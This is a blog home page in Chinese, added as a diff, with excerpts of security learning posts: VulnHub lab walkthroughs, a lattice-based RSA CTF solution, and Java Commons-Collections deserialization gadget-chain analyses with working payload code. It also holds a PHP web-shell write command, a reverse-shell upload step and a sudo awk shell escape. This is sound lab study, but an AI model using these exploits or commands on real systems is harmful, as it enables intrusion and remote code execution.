@@ -1,0 +1,1537 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>Arcueid&#39;s BLOG</title>
+    <meta name="author" content="Arcueid" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/Arcueid.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.net" />
+<script src="https://cdn.staticfile.net/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.net/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.net/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.net/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://cdn.staticfile.net/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>ARCUEID&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;ARCUEID&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>Arcueid&#39;s BLOG</h1>
+                <h3></h3>
+                <h5></h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div id="home-posts-wrap" true ref="homePostsWrap">
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2023/10/30/vulnhub%20momentum%20%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/">
+        <h2 class="post-title">vulnhub momentum 靶机复盘</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/10/30
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>到学校了 原来的桥接配置要改<br>这里记录几个点备忘</p>
+<h2 id="1-virtualbox-桥接-未指定"><a href="#1-virtualbox-桥接-未指定" class="headerlink" title="1.virtualbox 桥接 未指定"></a>1.virtualbox 桥接 未指定</h2><p>重新安装驱动VBoxNetLwf.inf</p>
+<h2 id="2-配置完靶机启动失败"><a href="#2-配置完靶机启动失败" class="headerlink" title="2.配置完靶机启动失败"></a>2.配置完靶机启动失败</h2><p>手动安装VBoxNetLwf.inf<br>不要用virtualbox自带的netlwfinstall</p>
+<h2 id="3-配置完nmap扫不到"><a href="#3-配置完nmap扫不到" class="headerlink" title="3.配置完nmap扫不到"></a>3.配置完nmap扫不到</h2><p>rw init&#x3D;&#x2F;bin&#x2F;bash<br>进去看看网卡配置</p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/117424099fff4c03a5684ac4fe2e1313.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>一个没什么功能点的web<br><img src="https://img-blog.csdnimg.cn/9e8c7a85cad9434782eab0aa104aa645.png" alt="在这里插入图片描述"></p>
+<p>在main.js下发现opus-details.php<br>可以传参id<br>然后会原封不动的展示<br>可以xss 没啥用<br>尝试对cookie解密<br>没解出来</p>
+<p>这里卡了半小时<br>后面去看别人的wp<br>发现就是得解 不知道为什么cyberchef解不出来 python也解不出来<br><img src="https://img-blog.csdnimg.cn/94f1d690d2b04485bd6a97560b79b4a1.png" alt="在这里插入图片描述"><br>直接拿main.js的代码解<br>解出来的东西看着像用户名-密码<br>因为开方了22端口 可以尝试ssh登录<br>登录失败</p>
+<p>那么尝试以这个做个字典再用hydra跑<br>跑出来密码是<code>auxerre-alienum##</code></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://img-blog.csdnimg.cn/a8edca85d2af4cd1baa770901c4cefac.png" alt="在这里插入图片描述"><br>通过linpeas遍历了一下脆弱性<br>没发现什么明显的利用点<br>通过pyps64查看到redis进程<br>通过keys *<br>发现存在key rootpass<br><code>get rootpass</code><br>得到密码<br>然后su过去就行了</p>
+<p>这块由于我第一次见redis 练了一些redis的命令给key整没了所以没图</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/10/30/vulnhub%20momentum%20%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/09/09/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202022%E3%80%91LRSA/">
+        <h2 class="post-title">【羊城杯 2022】LRSA</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/9/9
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>最近学了格<br>找点题做做</p>
+<p>通过gcd和整除可以得到P, Q<br><code>t 同余 pP -58 P + q mod Q</code><br>有<br><code>(t-q) = P(p-58) + KQ</code><br>构造格</p>
+<pre><code class="python">L = Matrix(ZZ,[
+    [1,P],
+    [0,Q]
+])
+</code></pre>
+<p>√p^2^ +q^2^ 和 √2√2^2048接近<br>于是脚本如下</p>
+<pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+
+
+B = 1023
+PPQ = 17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981
+PQQ = 17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909
+t = 44
+c = 4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746
+e = 65537
+
+
+P = PPQ//gmpy2.gcd(PPQ, PQQ)
+Q = PQQ//gmpy2.gcd(PPQ, PQQ)
+
+L = Matrix(ZZ,[
+    [1,P],
+    [0,Q]
+])
+
+p,q = L.LLL()[0]
+pp = abs(p)+58
+qq = abs(q)+t
+phi = (pp-1)*(qq-1)
+d = gmpy2.invert(e,phi)
+print(long_to_bytes(pow(c,d,pp*qq)))
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/09/09/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202022%E3%80%91LRSA/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/23/Java%20cc%E9%93%BE2%20%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">Java cc链2 分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/23
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>cc4</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commons-collections4 --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
+    &lt;version&gt;4.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>由ysoSerial 出口和之前一样InvokerTransformer<br><img src="https://img-blog.csdnimg.cn/55da5c7e9d914aa09cc8c2d78454c2d2.png" alt="在这里插入图片描述"><br>跟进<code>TransformingComparator#compare	</code><br><img src="https://img-blog.csdnimg.cn/68fc29f2d3104fb2b7392eeb464b8084.png" alt="在这里插入图片描述"><br>往上<code>PriorityQueue#siftDownUsingComparator</code><br><img src="https://img-blog.csdnimg.cn/43d470ff994743a39e9dbe58c84068fe.png" alt="在这里插入图片描述"></p>
+<p>再往上<br><code>PriorityQueue#siftDown</code><br>在往上heapify<br>然后到readObject<br><img src="https://img-blog.csdnimg.cn/a00e2b6f084f419d94a46dc565727024.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/55e4e73514cc41f7933112b7731c9c95.png" alt="在这里插入图片描述"><br>于是链子有了<br>我们尝试写一个payload试试看<br><img src="https://img-blog.csdnimg.cn/3851c16b7a1a42e7abc66c19d75ef267.png" alt="在这里插入图片描述"><br>注意size最少要2才能进siftDown 所以我们要给priorityQueue add元素<br>且在add第二个元素的时候会调siftUp, siftUp最后也能到compare<br>为了避免这种情况我们需要反射赋值TransformingComparator</p>
+<p>于是最终代码如下</p>
+<pre><code class="java">import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CC2 &#123;
+
+
+
+    public static void main(String[] args) throws Exception&#123;
+        Transformer[] transformers = new Transformer[]&#123;
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
+            new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),
+            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)
+        &#125;;
+        ChainedTransformer&lt;Object&gt; chainedTransformer = new ChainedTransformer&lt;&gt;(transformers);
+        TransformingComparator&lt;Object, Object&gt; transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));
+        PriorityQueue priorityQueue = new PriorityQueue(1,transformingComparator);
+
+        priorityQueue.add(1);
+        priorityQueue.add(1);
+
+
+        Field fieldTransformer = TransformingComparator.class.getDeclaredField(&quot;transformer&quot;);
+        fieldTransformer.setAccessible(true);
+        fieldTransformer.set(transformingComparator,chainedTransformer);
+
+
+        serial(priorityQueue);
+        unSerial(&quot;ser.bin&quot;);
+
+
+    &#125;
+    public static void serial(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerial(String path) throws Exception&#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #ffa2c4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/java/" style="color: #ff7d73">java</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/23/Java%20cc%E9%93%BE2%20%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/10/doubletrouble%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">
+        <h2 class="post-title">doubletrouble靶机通关详解</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="https://img-blog.csdnimg.cn/7b934ad50f4f43f6a111332a6ab22dd3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2b2c328306414f149022bc41553bd9b9.png" alt="在这里插入图片描述"></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>扫目录<br>发现secret路径<br>里面有个图<img src="https://img-blog.csdnimg.cn/52e0ef0d0cc24d4f96c48b6f9e5a756c.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/95eff4d90dcd40958ecadccffd02048a.png" alt="在这里插入图片描述"></p>
+<p>qdPM9.1 网上找找exp<br><img src="https://img-blog.csdnimg.cn/afa890ae5a8b4078b99b10d36f71e691.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/766f42bb23c94fe1947dfa10ef0c656f.png" alt="在这里插入图片描述"><br>反弹shell<br><code>http://192.168.0.107//uploads/users/632300-backdoor.php?cmd=echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</code><br>蚁剑连上去传php-reverse-shell.php</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>优化shell<br><img src="https://img-blog.csdnimg.cn/fafd002e556e42e68a9f1b6be9713d4c.png" alt="在这里插入图片描述"></p>
+<p>发现sudo-l 可以用awk<br><code>sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code><br><img src="https://img-blog.csdnimg.cn/309dc2783dd541ecb205e91a5248aea0.png" alt="在这里插入图片描述"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #03a9f4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/08/10/doubletrouble%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/08/09/CommonCollections3%E9%93%BE%E5%88%86%E6%9E%90/">
+        <h2 class="post-title">CommonCollections3链分析</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/9
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>先介绍一下<code>URLClassLoader</code><br><img src="https://img-blog.csdnimg.cn/e2bc26dffb3a4724bb733b6734f743ef.png" alt="在这里插入图片描述"></p>
+<p>URLClassLoader可以从传入的URL上加载任意类<br>且支持http协议<br><img src="https://img-blog.csdnimg.cn/a302b397909b406dbd57b79b2c17e90d.png" alt="在这里插入图片描述"><br>实际上类加载最关键的地方在<code>Classloader#definClass()</code><br>所以我们要去找有谁调用了该方法<br><img src="https://img-blog.csdnimg.cn/fa83d3155c9842ba9c1e711c76b6df64.png" alt="在这里插入图片描述"><br>在<code>TemplatesImpl</code>的内部类<code>TransletClassLoader#defineClass()</code>处调用<br>往前	<img src="https://img-blog.csdnimg.cn/de913eb93f314c17afed00688aa27699.png" alt="在这里插入图片描述"><br><code>TemplatesImpl#defineTransletClasses()</code><br>往前<br><img src="https://img-blog.csdnimg.cn/e7ff0bcf5af34ab99b3664a13606fbd3.png" alt="在这里插入图片描述"></p>
+<p><code>TemplatesImpl#getTransletInstance()</code><br>往前<br><img src="https://img-blog.csdnimg.cn/7a41dec804084641b0910042fc31092c.png" alt="在这里插入图片描述"><br><code>TemplatesImpl#newTransformer()</code><br>这个函数是public修饰的可以被外部修饰<br>我们先写一个demo测一下</p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException &#123;
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;绝对路径&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+        tfactory.set(templates,new TransformerFactoryImpl());
+        templates.newTransformer();
+
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/d26c072e9a71451eb952bd46e1992613.png" alt="在这里插入图片描述"></p>
+<p>注意Test类要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>避免<code>TemplatesImpl#defineTransletClasses</code>抛空指针异常<br><img src="https://img-blog.csdnimg.cn/9c001550adf847b9a7f09057972667e1.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37654ba545c84b55880c89d4466c3d8b.png" alt="在这里插入图片描述"><br>TemplatesImpl实现了Serializable接口<br>后面和cc1差不多<br>改改就能用了<br>先测一下确保没写错<img src="https://img-blog.csdnimg.cn/531a7a796af940d29cd3f4c3f34f6da6.png"></p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3 &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, TransformerConfigurationException, NoSuchFieldException, URISyntaxException, NoSuchMethodException, InvocationTargetException &#123;
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class&lt;?&gt; clazz = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Field name = clazz.getDeclaredField(&quot;_name&quot;);
+        Field bytecodes = clazz.getDeclaredField(&quot;_bytecodes&quot;);
+//        Field tfactory = clazz.getDeclaredField(&quot;_tfactory&quot;);
+        name.setAccessible(true);
+        bytecodes.setAccessible(true);
+//        tfactory.setAccessible(true);
+        name.set(templates,&quot;ss&quot;);
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\IDEA\\maventest\\CC3\\CC3\\target\\classes\\Test.class&quot;));
+        byte[][] codes = &#123;code&#125;;
+        bytecodes.set(templates,codes);
+//        tfactory.set(templates,new TransformerFactoryImpl());
+//        templates.newTransformer();
+
+        Transformer[] transformers = new Transformer[]&#123;
+                new ConstantTransformer(templates)
+                ,new InvokerTransformer(&quot;newTransformer&quot;,null,null)
+                &#125;;
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap&lt;String, Object&gt; hashMap = new HashMap&lt;&gt;();
+        hashMap.put(&quot;value&quot;,&quot;value&quot;);
+        Map&lt;Object,Object&gt; decoratedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
+
+        Constructor constructor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;)
+                .getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        Object obj = constructor.newInstance(Target.class,decoratedMap);
+//        serialize(obj);
+        unSerialize(&quot;ser.bin&quot;);
+    &#125;
+    public static void serialize(Object obj) throws IOException &#123;
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    &#125;
+    public static Object unSerialize(String path) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path));
+        return ois.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/8baa119b8cfd4131a0490a3d2e8f40ea.png" alt="在这里插入图片描述"><br>在ysoserial上是用的<code>InstantiateTransformer</code><br>那我们再来看看这个怎么实现<br><img src="https://img-blog.csdnimg.cn/ce4e154d5816485990cd7179b08cde39.png" alt="在这里插入图片描述"><br>TrAXFilter的构造方法中调了newTransformer<br>我们可以通过<code>InstantiateTransformer#transform()</code>来调构造方法</p>
+<pre><code class="java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.net.*;
+import java.nio.file.Files;
